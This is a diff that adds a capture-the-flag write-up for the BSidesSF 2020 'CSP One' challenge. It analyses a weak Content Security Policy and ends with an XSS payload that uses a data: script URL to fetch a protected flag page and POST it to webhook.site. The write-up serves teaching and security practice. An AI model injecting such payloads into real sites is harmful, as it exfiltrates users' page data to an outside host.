@@ -1,0 +1,54 @@
+# BSidesSF 2020 CTF – CSP Bypass Challenge (CSP One)
+
+## Overview
+
+This challenge from the **BSidesSF 2020 CTF** is focused on **bypassing a Content Security Policy (CSP)** to exfiltrate sensitive data — specifically, a flag hidden at a protected endpoint.
+
+The primary learning goal is understanding how improper CSP configurations can still leave applications vulnerable to client-side attacks, even if inline scripts are blocked.
+
+---
+
+## Challenge Description
+
+We are presented with a web application that loads a page with the following CSP:
+
+```http
+Content-Security-Policy: connect-src '*'; script-src 'self' data:
+```
+
+
+A hidden flag is located at the path `/csp-one-flag`, but direct access is prevented unless you can execute JavaScript in the context of the page.
+
+---
+
+## CSP Policy Analysis
+
+Here's what the CSP means:
+
+- **`script-src 'self' data:`**: 
+  - Allows loading scripts only from the same origin (`'self'`) or using the `data:` scheme.
+  
+- **`connect-src '*':`**
+  - Permits `fetch`, `XMLHttpRequest`, or WebSocket connections to any external domain — a major opening for data exfiltration.
+
+---
+
+## Objective
+
+Bypass the CSP to:
+
+1. Retrieve the contents of `/csp-one-flag` using JavaScript.
+2. Exfiltrate that content to an external service, such as [webhook.site](https://webhook.site), where we can view it.
+
+---
+
+## Exploit Strategy
+
+Since inline scripts are blocked but `script-src` allows `data:` URLs, we can inject JavaScript using a `data:`-based script tag.
+
+## Payload:
+
+```html
+<script src="data:text/javascript,fetch('/csp-one-flag').then(r=>r.text()).then(data=>fetch('https://webhook.site/',{method:'POST',body:data}))"></script>
+```
+
